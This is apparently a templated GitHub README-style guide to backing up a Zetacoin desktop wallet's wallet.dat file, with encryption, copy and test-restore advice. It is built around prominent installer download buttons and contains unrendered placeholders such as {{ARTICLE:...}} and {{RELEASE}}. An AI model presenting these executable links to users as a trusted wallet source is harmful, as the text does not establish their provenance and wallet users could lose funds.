![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">How to Back Up the Zetacoin Wallet</h1>

<p align="center">How the Zetacoin wallet stores keys, and the steps that keep a copy which actually restores.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

Back up Zetacoin Wallet by copying `wallet.dat` from the data directory to storage outside the machine, then repeating the copy after significant transactions and after generating new addresses. Encrypt the wallet first, keep at least two copies on different media, and never send the file to anyone. There is no seed phrase, so the file is the wallet.

## What you are actually backing up

`wallet.dat` contains the private keys. Everything else in the data directory  -  the chain, the index, the logs  -  is replaceable by syncing again, which is why only the file matters and why the chain does not need to be in your backup plan.

That single fact simplifies the whole procedure. You are not backing up an application or a database; you are copying one file that happens to be irreplaceable.

| Item | Back it up? | Why |
| --- | --- | --- |
| `wallet.dat` | yes, always | holds the private keys |
| `zetacoin.conf` | optional | settings only, easy to recreate |
| chain data | no | re-downloadable, and large |
| logs | no | diagnostic only |
| the installer | no | available from the release page |

The full walk-through, with the checks in order, is in [Restore a Zetacoin Wallet Backup](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/restore-a-backup-walkthrough.md).

## Where the file lives

Windows: `%AppData%/zetacoin/wallet.dat`. Linux: `~/.zetacoin/wallet.dat`. macOS: `~/Library/Application Support/zetacoin/wallet.dat`.

Those paths are hidden by default on Windows and macOS. Pasting the path into the address bar or using the Go to Folder dialog gets you there without hunting through hidden directories.

If you run the client with a custom data directory, the file is in that directory instead, and it is worth writing down which path you used, because a backup you cannot locate is not a backup.

## The procedure, in order

1. Open the wallet and unlock it if necessary.
2. Encrypt the wallet if it is not encrypted yet, and store the passphrase somewhere separate.
3. Close the client so the file is not being written.
4. Copy `wallet.dat` to a second location.
5. Verify the copy exists and has a plausible size.
6. Repeat after large transactions or new addresses.

Closing the client before copying avoids a backup of a half-written file. The risk is small, but the cost of a corrupt backup is total, so the extra step is worth taking every time.

For the background behind this step, [Where the Zetacoin Wallet File Lives](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-the-dat-file-lives.md) covers the same ground in more detail.

## Where to keep the copies

Two copies on different media is the minimum that survives a realistic failure. An external drive in the same room survives a disk failure; it does not survive a fire, a theft or a flood. A copy in a different building covers those.

For an encrypted wallet file, a cloud copy is defensible: the file is useless without the passphrase, and the passphrase is not in the same place. For an unencrypted file, a cloud copy is a full compromise waiting to happen, which is why encryption comes first in the procedure.

Never put the passphrase in the same place as the file, and never store it in a note that syncs to the same account.

## Testing that the backup works

A backup that has never been restored is a hope. Once, shortly after making the first copy, restore it into a fresh data directory on a spare machine or a test folder, let it rescan, and confirm the balance appears.

That test catches the two failures that matter: a copy of the wrong file, and a file that needs a passphrase you no longer know. Both are cheap to discover early and impossible to fix later.

{{ARTICLE:restore-zetacoin-wallet-backup}} walks through the restore, and {{ARTICLE:zetacoin-wallet-encryption-passphrase}} covers the passphrase discipline.

## How often

After every significant transaction, after generating addresses, and before any update or migration. For a wallet that receives regularly, a monthly copy plus a copy after each large movement is a reasonable rhythm.

If the only copy is older than your last transaction, the difference is lost. That is the whole rule: the backup's value is measured against the last thing you did, not against a calendar.

## Versioning the copies

A single overwritten copy is a backup with no history. If the current wallet is replaced by a new one, or a passphrase is changed on a file whose old passphrase you still remember, the previous version is the one that opens.

Keeping the last few copies, named by date, costs nothing and covers that case. It also makes it obvious which copy is newest, which matters when you are restoring under pressure and the filenames all look the same.

Delete old copies deliberately once a newer restore has been tested, rather than keeping an unlabelled pile that nobody can date.

## What a backup cannot do

It cannot recover a forgotten passphrase, and it cannot recover coins that were lost before the copy was made. If the file was never encrypted and was copied somewhere public, no later action makes that copy safe  -  the response is to create a new wallet and move the funds.

It also cannot convert legacy coins. A backup of a pre-2021 wallet holds keys to a retired chain, which is a different question with a different answer.

## Common questions

### Is there a seed phrase I should write down instead?

No. Zetacoin Wallet has no seed phrase; the keys live in `wallet.dat`, and that file is what you copy.

### Can I back up the whole data directory?

You can, but it is mostly chain data and it is large. Copying the single wallet file is faster, smaller and sufficient.

### Is it safe to store the file in the cloud?

Only if the wallet is encrypted and the passphrase is stored somewhere else. An unencrypted copy in cloud storage is a compromise.

### What happens if I lose both the file and the passphrase?

The coins are unrecoverable. There is no reset, no recovery service and no administrative override.

## The two-minute version

Encrypt, close, copy `wallet.dat` off the machine, keep a second copy elsewhere, and test the restore once. Everything else is repetition.

Related pages: {{ARTICLE:where-is-zetacoin-wallet-dat}} for paths, {{ARTICLE:recover-lost-zetacoin-wallet-file}} if the file is already missing, {{ARTICLE:move-zetacoin-wallet-new-computer}} for a full migration, and {{ARTICLE:zetacoin-wallet-seed-phrase-explained}} for why there are no words to write down. Keep the client current from {{RELEASE}} so backups are made by the same version that will restore them.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Does Zetacoin Use a Seed Phrase?](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/is-there-a-seed-phrase.md)
- [Restore a Zetacoin Wallet Backup](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/restore-a-backup-walkthrough.md)
- [Where the Zetacoin Wallet File Lives](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-the-dat-file-lives.md)
